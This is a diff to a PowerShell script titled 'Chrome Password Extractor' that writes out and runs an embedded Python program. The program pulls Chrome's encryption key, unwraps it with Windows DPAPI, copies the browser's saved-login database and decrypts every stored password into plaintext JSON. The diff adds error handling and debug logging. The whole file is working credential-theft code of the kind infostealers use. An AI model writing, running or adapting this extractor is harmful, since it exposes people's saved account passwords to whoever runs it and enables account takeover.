@@ -1,6 +1,6 @@
 # Chrome Password Extractor - Using Python for Decryption
 
-Write-Host "=== Chrome Password Extractor 1 ===" -ForegroundColor Cyan
+Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
 Write-Host ""
 
 # Create Python decryption script
@@ -11,90 +11,171 @@ import base64
 import sqlite3
 import shutil
 import os
-from Crypto.Cipher import AES
 
-# Get key
-local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-with open(local_state, "r", encoding="utf-8") as f:
-    state = json.loads(f.read())
+try:
+    from Crypto.Cipher import AES
+    import win32crypt
+except ImportError as e:
+    print(json.dumps({"error": f"Missing module: {e}"}))
+    sys.exit(1)
 
-encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
+try:
+    # Get key
+    local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    with open(local_state, "r", encoding="utf-8") as f:
+        state = json.loads(f.read())
 
-import win32crypt
-key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
+    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-# Copy database
-db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-temp_db = os.path.join(os.environ["TEMP"], "chrome_temp.db")
-shutil.copyfile(db_path, temp_db)
+    # Copy database
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+    temp_db = os.path.join(os.environ["TEMP"], "chrome_temp_{}.db".format(os.getpid()))
+    shutil.copyfile(db_path, temp_db)
 
-# Query
-conn = sqlite3.connect(temp_db)
-cursor = conn.cursor()
-cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-
-results = []
-for row in cursor.fetchall():
-    url, username, enc_pass = row
+    # Query
+    conn = sqlite3.connect(temp_db)
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
     
-    if not enc_pass:
-        continue
+    all_rows = cursor.fetchall()
+    sys.stderr.write(f"DEBUG: Found {len(all_rows)} total rows\n")
+
+    results = []
+    decryption_attempts = 0
+    decryption_failures = 0
     
-    # Decrypt
-    try:
-        if enc_pass[:3] == b'v10' or enc_pass[:3] == b'v20':
-            # AES-GCM
-            nonce = enc_pass[3:15]
-            ciphertext = enc_pass[15:-16]
-            tag = enc_pass[-16:]
-            
-            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-            password = cipher.decrypt_and_verify(ciphertext, tag).decode()
-        else:
-            # Old DPAPI
-            password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode()
+    for row in all_rows:
+        url, username, enc_pass = row
         
-        results.append({
-            "url": url,
-            "username": username,
-            "password": password
-        })
-    except Exception as e:
+        if not enc_pass:
+            sys.stderr.write(f"DEBUG: Skipping {url} - no encrypted password\n")
+            continue
+        
+        decryption_attempts += 1
+        sys.stderr.write(f"DEBUG: Attempting to decrypt {url}\n")
+        sys.stderr.write(f"DEBUG: Encrypted data length: {len(enc_pass)}\n")
+        sys.stderr.write(f"DEBUG: First 3 bytes: {enc_pass[:3]}\n")
+        
+        # Decrypt
+        try:
+            # Check version prefix
+            if enc_pass[:3] == b'v10':
+                # v10 format
+                nonce = enc_pass[3:15]
+                ciphertext = enc_pass[15:-16]
+                tag = enc_pass[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
+                
+                sys.stderr.write(f"DEBUG: Successfully decrypted (v10)\n")
+            elif enc_pass[:3] == b'v11' or enc_pass[:3] == b'v20':
+                # v11/v20 format - different structure
+                # v20: version(3) + nonce(12) + ciphertext + tag(16)
+                nonce = enc_pass[3:15]
+                # For v20, the tag is integrated differently
+                ciphertext_with_tag = enc_pass[15:]
+                
+                # Split ciphertext and tag
+                ciphertext = ciphertext_with_tag[:-16]
+                tag = ciphertext_with_tag[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                
+                # For v20, try without AAD first
+                try:
+                    password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
+                except:
+                    # Try with empty AAD
+                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                    password = cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
+                
+                sys.stderr.write(f"DEBUG: Successfully decrypted (v20)\n")
+            else:
+                # Old DPAPI
+                password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+                sys.stderr.write(f"DEBUG: Successfully decrypted (DPAPI)\n")
+            
+            results.append({
+                "url": url,
+                "username": username,
+                "password": password
+            })
+        except Exception as e:
+            decryption_failures += 1
+            sys.stderr.write(f"DEBUG: Decryption failed: {str(e)}\n")
+
+    sys.stderr.write(f"DEBUG: Total attempts: {decryption_attempts}, Failures: {decryption_failures}, Success: {len(results)}\n")
+
+    cursor.close()
+    conn.close()
+    
+    try:
+        os.remove(temp_db)
+    except:
         pass
 
-cursor.close()
-conn.close()
-os.remove(temp_db)
-
-# Output as JSON
-print(json.dumps(results, indent=2))
+    # Output as JSON
+    print(json.dumps(results))
+    
+except Exception as e:
+    print(json.dumps({"error": str(e)}))
+    sys.exit(1)
 '@
 
 $scriptPath = "$env:TEMP\decrypt_chrome.py"
 $pythonScript | Out-File $scriptPath -Encoding UTF8
 
 Write-Host "Installing Python dependencies..." -ForegroundColor Yellow
-python -m pip install pycryptodome pywin32 --quiet 2>&1 | Out-Null
+python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2>&1 | Out-Null
 
 Write-Host "Running Python decryptor..." -ForegroundColor Yellow
 Write-Host ""
 
+# Run and capture ALL output
 $output = python $scriptPath 2>&1 | Out-String
 
-if ($output -match "Traceback") {
-    Write-Host "Python error:" -ForegroundColor Red
-    Write-Host $output
-    Remove-Item $scriptPath
-    Read-Host "Press Enter to exit"
-    exit
-}
+Write-Host "=== RAW PYTHON OUTPUT ===" -ForegroundColor Cyan
+Write-Host $output
+Write-Host "=== END OUTPUT ===" -ForegroundColor Cyan
+Write-Host ""
 
 # Parse results
 try {
-    $passwords = $output | ConvertFrom-Json
+    # Check if output contains error
+    if ($output -match '"error"') {
+        Write-Host "Python script returned an error!" -ForegroundColor Red
+        $errorObj = $output | ConvertFrom-Json
+        Write-Host "Error: $($errorObj.error)" -ForegroundColor Red
+        Remove-Item $scriptPath
+        Read-Host "Press Enter to exit"
+        exit
+    }
+    
+    if ($output -match "Traceback") {
+        Write-Host "Python exception occurred!" -ForegroundColor Red
+        Remove-Item $scriptPath
+        Read-Host "Press Enter to exit"
+        exit
+    }
+    
+    # Try to parse JSON
+    $passwords = $output.Trim() | ConvertFrom-Json
+    
+    if (-not $passwords -or $passwords.Count -eq 0) {
+        Write-Host "No passwords found in output!" -ForegroundColor Yellow
+        Write-Host "This could mean:" -ForegroundColor Yellow
+        Write-Host "  - Chrome has no saved passwords" -ForegroundColor Yellow
+        Write-Host "  - Python script failed silently" -ForegroundColor Yellow
+        Write-Host "  - Chrome is running (close it!)" -ForegroundColor Yellow
+        Remove-Item $scriptPath
+        Read-Host "Press Enter to exit"
+        exit
+    }
     
     Write-Host "========================================" -ForegroundColor Green
-    Write-Host "Successfully extracted 1 $($passwords.Count) passwords!" -ForegroundColor Green
+    Write-Host "Successfully extracted $($passwords.Count) passwords!" -ForegroundColor Green
     Write-Host "========================================" -ForegroundColor Green
     Write-Host ""
     
